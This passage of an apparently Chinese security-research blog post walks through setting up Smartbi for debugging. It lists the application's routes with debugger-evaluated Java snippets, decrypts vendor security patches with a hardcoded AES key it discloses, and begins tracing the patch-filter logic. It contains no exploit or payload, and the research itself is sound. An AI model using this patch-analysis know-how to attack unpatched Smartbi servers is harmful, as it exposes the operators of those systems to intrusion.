class="variable">$item</span>.Name</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$targetPath</span> = <span class="built_in">Join-Path</span> <span class="literal">-Path</span> <span class="variable">$normalizedOutputPath</span> <span class="literal">-ChildPath</span> <span class="variable">$targetFileName</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Test-Path</span> <span class="literal">-LiteralPath</span> <span class="variable">$targetPath</span>) &#123;</span><br><span class="line">            <span class="variable">$baseName</span> = [<span class="type">System.IO.Path</span>]::GetFileNameWithoutExtension(<span class="variable">$targetFileName</span>)</span><br><span class="line">            <span class="variable">$extension</span> = [<span class="type">System.IO.Path</span>]::GetExtension(<span class="variable">$targetFileName</span>)</span><br><span class="line">            <span class="variable">$index</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="variable">$candidateName</span> = <span class="string">&quot;&#123;0&#125;.&#123;1&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span> <span class="variable">$baseName</span>, <span class="variable">$index</span>, <span class="variable">$extension</span></span><br><span class="line">                <span class="variable">$targetPath</span> = <span class="built_in">Join-Path</span> <span class="literal">-Path</span> <span class="variable">$normalizedOutputPath</span> <span class="literal">-ChildPath</span> <span class="variable">$candidateName</span></span><br><span class="line">                <span class="variable">$index</span>++</span><br><span class="line">            &#125; <span class="keyword">while</span> (<span class="built_in">Test-Path</span> <span class="literal">-LiteralPath</span> <span class="variable">$targetPath</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$targetDir</span> = <span class="built_in">Split-Path</span> <span class="literal">-Path</span> <span class="variable">$targetPath</span> <span class="literal">-Parent</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="operator">-not</span> (<span class="built_in">Test-Path</span> <span class="literal">-LiteralPath</span> <span class="variable">$targetDir</span>)) &#123;</span><br><span class="line">        <span class="built_in">New-Item</span> <span class="literal">-ItemType</span> Directory <span class="literal">-Path</span> <span class="variable">$targetDir</span> <span class="literal">-Force</span> | <span class="built_in">Out-Null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Copy-Item</span> <span class="literal">-LiteralPath</span> <span class="variable">$item</span>.FullName <span class="literal">-Destination</span> <span class="variable">$targetPath</span> <span class="literal">-Force</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Write-Host</span> (<span class="string">&quot;Done. Matched extensions: &#123;0&#125;&quot;</span> <span class="operator">-f</span> (<span class="variable">$normalizedExtensions</span> <span class="operator">-join</span> <span class="string">&quot;, &quot;</span>))</span><br><span class="line"><span class="built_in">Write-Host</span> (<span class="string">&quot;Output directory: &#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="variable">$normalizedOutputPath</span>)</span><br><span class="line"><span class="built_in">Write-Host</span> (<span class="string">&quot;Keep original structure: &#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="variable">$keepStructureEnabled</span>)</span><br><span class="line"><span class="built_in">Read-Host</span> <span class="string">&quot;Press Enter to exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>之后，在javax.servlet.http.HttpServlet#service(javax.servlet.ServletRequest, javax.servlet.ServletResponse)断点，访问<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:18080/smartbi/vision/index.jsp" >http://127.0.0.1:18080/smartbi/vision/index.jsp<i class="fas fa-external-link-alt"></i></a> ，如果能断住，就没问题了。</p>
+<p>具体版本可以看webapps&#x2F;smartbi&#x2F;vision&#x2F;packageinfo.txt：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774835276106-2dec2e9f-1af8-4afb-9638-691ebc3d5dee.png"  alt="img"></p>
+<p>然后就可以开始调试了。</p>
+<p>关于版本问题，我这里使用的是10.5.8，V11-20250507，V11-20260303这三个版本。其中V10版本的由于证书问题没法正常运行，只能静态分析。最新版本的V11官网可以下载。其他两个版本需要读者自行想办法获取。</p>
+<h1 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h1><p>smartbi使用了标准的servlet模式和controller模式。</p>
+<p>远程调试成功后，在HttpServlet#service上打断点，把所有的servlet和filter列出来：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774693027499-bc44513c-602f-41f3-ba9f-15566657f75c.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774693047833-d2828a52-c5f0-4d43-808b-eec8b6447c9c.png"  alt="img"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 获取 ServletContext</span></span><br><span class="line">    javax.servlet.<span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> req.getServletContext();</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 提取 Servlet 和 Servlet-Mapping</span></span><br><span class="line">    sb.append(<span class="string">&quot;================ Servlet Mappings ================\n&quot;</span>);</span><br><span class="line">    java.util.Map&lt;String, ? <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.ServletRegistration&gt; servlets = context.getServletRegistrations();</span><br><span class="line">    <span class="keyword">for</span> (javax.servlet.ServletRegistration reg : servlets.values()) &#123;</span><br><span class="line">        sb.append(String.format(<span class="string">&quot;Servlet Name : %s\n&quot;</span>, reg.getName()));</span><br><span class="line">        sb.append(String.format(<span class="string">&quot;Class Name   : %s\n&quot;</span>, reg.getClassName()));</span><br><span class="line">        sb.append(String.format(<span class="string">&quot;Mappings     : %s\n&quot;</span>, reg.getMappings()));</span><br><span class="line">        sb.append(<span class="string">&quot;--------------------------------------------------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 提取 Filter 和 Filter-Mapping</span></span><br><span class="line">    sb.append(<span class="string">&quot;\n================ Filter Mappings ================\n&quot;</span>);</span><br><span class="line">    java.util.Map&lt;String, ? <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.FilterRegistration&gt; filters = context.getFilterRegistrations();</span><br><span class="line">    <span class="keyword">for</span> (javax.servlet.FilterRegistration reg : filters.values()) &#123;</span><br><span class="line">        sb.append(String.format(<span class="string">&quot;Filter Name      : %s\n&quot;</span>, reg.getName()));</span><br><span class="line">        sb.append(String.format(<span class="string">&quot;Class Name       : %s\n&quot;</span>, reg.getClassName()));</span><br><span class="line">        sb.append(String.format(<span class="string">&quot;URL Mappings     : %s\n&quot;</span>, reg.getUrlPatternMappings()));</span><br><span class="line">        sb.append(String.format(<span class="string">&quot;Servlet Mappings : %s\n&quot;</span>, reg.getServletNameMappings()));</span><br><span class="line">        sb.append(<span class="string">&quot;--------------------------------------------------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 将结果写入文件 (请根据你的操作系统修改路径，这里以 Windows 为例)</span></span><br><span class="line">    <span class="comment">// 如果是 Mac/Linux，可以改成 &quot;/tmp/web_mappings.txt&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;servlet_mappings.txt&quot;</span>;</span><br><span class="line">    java.nio.file.<span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> java.nio.file.Paths.get(filePath);</span><br><span class="line">    java.nio.file.<span class="type">Path</span> <span class="variable">absolutePath</span> <span class="operator">=</span> path.toAbsolutePath();</span><br><span class="line">    java.nio.file.Files.write(</span><br><span class="line">            java.nio.file.Paths.get(filePath),</span><br><span class="line">            sb.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回成功提示及提取的内容概览</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;提取成功，已写入文件: &quot;</span> + absolutePath + <span class="string">&quot;\n\n&quot;</span> + sb.substring(<span class="number">0</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;提取失败: &quot;</span> + e.getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当然，直接看web.xml也行，但我觉得列出来更清楚一点。</p>
+<p>发现有dispatcher：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774693274532-b69c77a7-09b8-47bd-a08a-b2b21f17e540.png"  alt="img"></p>
+<p>然后在smartbixlibs.org.springframework.web.servlet.DispatcherServlet#doDispatch打断点，把controller和interceptor列出来：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774693353406-791e8a6c-6ae6-47bc-8657-6a295470cf61.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774693373566-53709e91-6a47-4292-af9c-79118e13cc39.png"  alt="img"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 创建临时文件</span></span><br><span class="line">    java.io.<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> java.io.File.createTempFile(<span class="string">&quot;spring_mvc_mappings_&quot;</span>, <span class="string">&quot;.txt&quot;</span>);</span><br><span class="line">    java.io.<span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.PrintWriter(<span class="keyword">new</span> <span class="title class_">java</span>.io.OutputStreamWriter(<span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(file), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 Spring 上下文</span></span><br><span class="line">    smartbixlibs.org.springframework.web.context.<span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getWebApplicationContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==========================================================</span></span><br><span class="line">    <span class="comment">// 2. 提取所有的 Controller 和 Method 映射关系</span></span><br><span class="line">    <span class="comment">// ==========================================================</span></span><br><span class="line">    writer.println(<span class="string">&quot;================================\nController &amp; Method Mappings\n================================&quot;</span>);</span><br><span class="line">    java.util.Map&lt;String, smartbixlibs.org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&gt; mappings = </span><br><span class="line">            context.getBeansOfType(smartbixlibs.org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (smartbixlibs.org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping mapping : mappings.values()) &#123;</span><br><span class="line">        java.util.Map&lt;smartbixlibs.org.springframework.web.servlet.mvc.method.RequestMappingInfo, smartbixlibs.org.springframework.web.method.HandlerMethod&gt; handlerMethods = mapping.getHandlerMethods();</span><br><span class="line">        <span class="keyword">for</span> (java.util.Map.Entry&lt;smartbixlibs.org.springframework.web.servlet.mvc.method.RequestMappingInfo, smartbixlibs.org.springframework.web.method.HandlerMethod&gt; entry : handlerMethods.entrySet()) &#123;</span><br><span class="line">            writer.println(<span class="string">&quot;Mapping : &quot;</span> + entry.getKey().toString());</span><br><span class="line">            writer.println(<span class="string">&quot;Method  : &quot;</span> + entry.getValue().getBeanType().getName() + <span class="string">&quot;#&quot;</span> + entry.getValue().getMethod().getName());</span><br><span class="line">            writer.println(<span class="string">&quot;--------------------------------------------------&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==========================================================</span></span><br><span class="line">    <span class="comment">// 3. 提取所有的 Interceptor 和 Mapping 映射关系</span></span><br><span class="line">    <span class="comment">// ==========================================================</span></span><br><span class="line">    writer.println(<span class="string">&quot;\n================================\nInterceptor Mappings\n================================&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.getHandlerMappings() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Object hm : <span class="built_in">this</span>.getHandlerMappings()) &#123;</span><br><span class="line">            writer.println(<span class="string">&quot;&gt;&gt;&gt; HandlerMapping Channel: &quot;</span> + hm.getClass().getName());</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 向上遍历父类，寻找 adaptedInterceptors 字段（最稳定，不依赖特定包名）</span></span><br><span class="line">            java.util.List&lt;?&gt; interceptors = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class&lt;?&gt; clazz = hm.getClass();</span><br><span class="line">                java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">while</span> (clazz != <span class="literal">null</span> &amp;&amp; field == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        field = clazz.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                        clazz = clazz.getSuperclass();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">                    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    interceptors = (java.util.List&lt;?&gt;) field.get(hm);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignore) &#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (interceptors != <span class="literal">null</span> &amp;&amp; !interceptors.isEmpty()) &#123;</span><br><span class="line">                <span class="keyword">for</span> (Object interceptor : interceptors) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (interceptor != <span class="literal">null</span> &amp;&amp; interceptor.getClass().getName().endsWith(<span class="string">&quot;MappedInterceptor&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">actualInterceptor</span> <span class="operator">=</span> interceptor;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">incObj</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">excObj</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            java.lang.reflect.<span class="type">Field</span> <span class="variable">incField</span> <span class="operator">=</span> interceptor.getClass().getDeclaredField(<span class="string">&quot;includePatterns&quot;</span>);</span><br><span class="line">                            incField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            incObj = incField.get(interceptor);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            java.lang.reflect.<span class="type">Field</span> <span class="variable">excField</span> <span class="operator">=</span> interceptor.getClass().getDeclaredField(<span class="string">&quot;excludePatterns&quot;</span>);</span><br><span class="line">                            excField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            excObj = excField.get(interceptor);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// --- 【去 Lambda 化】纯代码铺开解析 Include 规则 ---</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">includesStr</span> <span class="operator">=</span> <span class="string">&quot;[]&quot;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (incObj <span class="keyword">instanceof</span> String[]) &#123;</span><br><span class="line">                            includesStr = java.util.Arrays.toString((String[]) incObj);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (incObj <span class="keyword">instanceof</span> Object[]) &#123;</span><br><span class="line">                            java.util.List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">java</span>.util.ArrayList&lt;&gt;();</span><br><span class="line">                            <span class="keyword">for</span> (Object item : (Object[]) incObj) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (item != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">try</span> &#123;</span><br><span class="line">                                        java.lang.reflect.<span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> item.getClass().getMethod(<span class="string">&quot;getPatternString&quot;</span>);</span><br><span class="line">                                        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                                        list.add((String) m.invoke(item));</span><br><span class="line">                                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                                        list.add(item.toString());</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            includesStr = list.toString();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (incObj != <span class="literal">null</span>) &#123;</span><br><span class="line">                            includesStr = incObj.toString();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// --- 【去 Lambda 化】纯代码铺开解析 Exclude 规则 ---</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">excludesStr</span> <span class="operator">=</span> <span class="string">&quot;[]&quot;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (excObj <span class="keyword">instanceof</span> String[]) &#123;</span><br><span class="line">                            excludesStr = java.util.Arrays.toString((String[]) excObj);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (excObj <span class="keyword">instanceof</span> Object[]) &#123;</span><br><span class="line">                            java.util.List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">java</span>.util.ArrayList&lt;&gt;();</span><br><span class="line">                            <span class="keyword">for</span> (Object item : (Object[]) excObj) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (item != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">try</span> &#123;</span><br><span class="line">                                        java.lang.reflect.<span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> item.getClass().getMethod(<span class="string">&quot;getPatternString&quot;</span>);</span><br><span class="line">                                        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                                        list.add((String) m.invoke(item));</span><br><span class="line">                                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                                        list.add(item.toString());</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            excludesStr = list.toString();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (excObj != <span class="literal">null</span>) &#123;</span><br><span class="line">                            excludesStr = excObj.toString();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 获取真正干活的 Interceptor</span></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            java.lang.reflect.<span class="type">Field</span> <span class="variable">intField</span> <span class="operator">=</span> interceptor.getClass().getDeclaredField(<span class="string">&quot;interceptor&quot;</span>);</span><br><span class="line">                            intField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            actualInterceptor = intField.get(interceptor);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">                        writer.println(<span class="string">&quot;Interceptor : &quot;</span> + actualInterceptor.getClass().getName());</span><br><span class="line">                        writer.println(<span class="string">&quot;Include URLs: &quot;</span> + includesStr);</span><br><span class="line">                        writer.println(<span class="string">&quot;Exclude URLs: &quot;</span> + excludesStr);</span><br><span class="line">                        writer.println(<span class="string">&quot;--------------------------------------------------&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (interceptor != <span class="literal">null</span>) &#123;</span><br><span class="line">                        writer.println(<span class="string">&quot;Global Interceptor: &quot;</span> + interceptor.getClass().getName());</span><br><span class="line">                        writer.println(<span class="string">&quot;--------------------------------------------------&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                writer.println(<span class="string">&quot;No interceptors attached.&quot;</span>);</span><br><span class="line">                writer.println(<span class="string">&quot;--------------------------------------------------&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 落盘并返回绝对路径</span></span><br><span class="line">    writer.flush();</span><br><span class="line">    writer.close();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;提取成功！文件路径: &quot;</span> + file.getAbsolutePath();</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;提取失败: &quot;</span> + e.getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然而，上面的结果是不完整的，因为smartbi还有插件机制，插件不在webapps下，所以不共享servletContext，无法通过上面的方法列出。下面补丁分析的时候能看到插件的位置。</p>
+<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>官网补丁链接</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.smartbi.com.cn/patchinfo" >https://www.smartbi.com.cn/patchinfo<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="补丁解密"><a href="#补丁解密" class="headerlink" title="补丁解密"></a>补丁解密</h2><p>从官网下载的补丁，打开后发现是一串base64，大概率是加密后的。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774683080571-1e4ce0a5-86a4-4e50-861a-445e4dad956d.png"  alt="img"></p>
+<p>根据官网wiki：<a class="link"   target="_blank" rel="noopener" href="https://wiki.smartbi.com.cn/pages/viewpage.action?pageId=50692623" >https://wiki.smartbi.com.cn/pages/viewpage.action?pageId=50692623<i class="fas fa-external-link-alt"></i></a> </p>
+<p>找到手动安装补丁的位置：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774683224305-99996722-30aa-4891-8bee-42b1863f35d7.png"  alt="img"></p>
+<p>手动更新后抓包，定位接口：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774683317176-caea999a-ee9e-4b12-aaa2-5cff89c535e4.png"  alt="img"></p>
+<p>然而，在上面路由分析得到的servlet-mapping和controller-mapping搜索，都找不到对应的方法。</p>
+<p>这里用到一种新方法，在service方法上断点，然后直接找对应servlet的绝对路径。因为进入service后，this已经是实际处理请求的servlet了。</p>
+<p>this.getClass().getProtectionDomain().getCodeSource().getLocation()</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774684396411-0b7a3180-91ce-4452-af72-84c70c25e180.png"  alt="img"></p>
+<p>于是知道了对应jar包的位置，将其添加进idea库，然后看一下extension.xml：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774684876501-006bf8b3-9f17-4ce1-a4f3-ed32ffd7b41f.png"  alt="img"></p>
+<p>找到了对应的servlet，是SecurityPatchUploadServlet。跟进如下图所示的调用栈：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774687966557-31f44248-f2eb-4c00-a38f-9593e23eee8b.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774687980526-a281a576-b93f-4366-ad30-c8089d215db3.png"  alt="img"></p>
+<p>最终发现是AES&#x2F;CBC&#x2F;PKCS5Padding加密，key和iv都为1234567812345678</p>
+<p>在cyberchef中解密并保存为jar：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774688099809-d663cb5f-b6dc-4f10-a90b-b9e8b53c7ea7.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774688118824-7f55ade8-ceb6-4944-9622-80829748eaed.png"  alt="img"></p>
+<h2 id="patch逻辑"><a href="#patch逻辑" class="headerlink" title="patch逻辑"></a>patch逻辑</h2><p>先概括一下：当前版本，内置前面所有的补丁，但不是通过patch的方式，而是在代码中直接修复；上传补丁后，只有当前版本之后出现的新漏洞，才会被patch；补丁patch可以回退，但无法改变这个版本内置的补丁</p>
+<p>在smartbi.security.patch.PatchFilter#reload，直接拉到最后：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774692488975-691fb99f-c397-441b-a212-77f75c053adc.png"  alt="img"></p>
+<p>urlRules是关键，往上找：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774692548563-db5509ba-d0f1-46df-988c-1bd95f6bedc5.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774692551023-c268ac52-8b04-457e-865c-27e2eb3839f9.png"  alt="img"></p>
+<p>一开始会新建一个空urlRules，然后添加内置补丁中不存在的patch，最后add进urlRules。</p>
+<p>然后在smartbi.security.patch.PatchFilter#doFilter生效：</p>
